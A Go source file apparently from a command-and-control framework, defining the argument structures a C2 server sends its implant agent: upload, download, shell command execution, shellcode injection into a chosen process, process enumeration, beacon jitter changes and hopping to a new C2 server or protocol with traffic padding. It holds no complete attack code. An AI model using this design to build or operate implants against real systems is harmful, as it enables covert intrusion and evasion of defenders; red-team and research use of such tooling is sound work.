package models

import (
	"github.com/faanross/numinon/internal/agent/config"
)

// -------------------------------------------------------------------
// | All the command-specific ARGUMENT structs, i.e. SERVER -> AGENT |
// -------------------------------------------------------------------

// UploadArgs defines arguments for the "upload" command.
type UploadArgs struct {
	TargetDirectory   string `json:"target_dir"`          // Absolute directory path on the agent's system
	TargetFilename    string `json:"target_filename"`     // Desired filename on the agent's system
	FileContentBase64 string `json:"file_content_base64"` // Base64 encoded content of the file
	ExpectedSha256    string `json:"expected_sha256"`     // SHA256 hash of the original (decoded) file content
	OverwriteIfExists bool   `json:"overwrite_if_exists"` // Flag to allow overwriting if file exists
}

// DownloadArgs defines arguments for the "download" command.
type DownloadArgs struct {
	SourceFilePath string `json:"source_file_path"` // Absolute path of the file to download from the agent's system
}

// RunCmdArgs defines arguments for the "run_cmd" command.
type RunCmdArgs struct {
	CommandLine string `json:"command_line"`    // The full command string to be executed
	Shell       string `json:"shell,omitempty"` // Optional: "cmd", "powershell", "ps". Agent default if empty.
	// TimeoutSeconds int `json:"timeout_seconds,omitempty"` // DEFERRED: Agent uses internal default for now
}

// ShellcodeArgs defines arguments for the "execute_shellcode" command.
type ShellcodeArgs struct {
	ShellcodeBase64             string `json:"shellcode_base64"`                    // Base64 encoded shellcode (DLL or BIN)
	TargetPID                   uint32 `json:"target_pid,omitempty"`                // 0 or omitted for self-injection
	ArgumentsForShellcodeBase64 string `json:"args_for_shellcode_base64,omitempty"` // Optional args for the shellcode/export
	ExportName                  string `json:"export_name,omitempty"`               // Name of the function to call in the DLL (e.g., "LaunchCalc", "RunMe")
	// If empty, loader might default to DllMain or a pre-agreed export.
}

// EnumerateArgs defines arguments for the "enumerate_processes" command.
type EnumerateArgs struct {
	ProcessName string `json:"process_name,omitempty"` // If empty, list all. Otherwise, filter by this name.
	// Add future flags here e.g., IncludePath *bool, IncludeOwner *bool
}

// MorphArgs defines parameters that can be dynamically updated in the agent.
type MorphArgs struct {
	NewDelay  *string  `json:"new_delay,omitempty"`  // Duration string, e.g., "30s"
	NewJitter *float64 `json:"new_jitter,omitempty"` // e.g., 0.0 to 1.0
}

// HopArgs defines parameters for the agent to transition its C2 communication.
type HopArgs struct {
	NewProtocol          config.AgentProtocol `json:"new_protocol"`
	NewServerIP          string               `json:"new_server_ip"`
	NewServerPort        string               `json:"new_server_port"`
	NewCheckInEndpoint   *string              `json:"new_check_in_endpoint,omitempty"`
	NewResultsEndpoint   *string              `json:"new_results_endpoint,omitempty"`
	NewWebSocketEndpoint *string              `json:"new_websocket_endpoint,omitempty"`
	NewDelay             *string              `json:"new_delay,omitempty"`
	NewJitter            *float64             `json:"new_jitter,omitempty"`
	NewBeaconMode        *bool                `json:"new_beacon_mode,omitempty"`
	NewCheckinMethod     *string              `json:"new_checkin_method,omitempty"`
	NewEnablePadding     *bool                `json:"new_enable_padding,omitempty"`
	NewMinPaddingBytes   *int                 `json:"new_min_padding_bytes,omitempty"`
	NewMaxPaddingBytes   *int                 `json:"new_max_padding_bytes,omitempty"`
	// No UUID since that will remain the same, Hop should not influence it
}
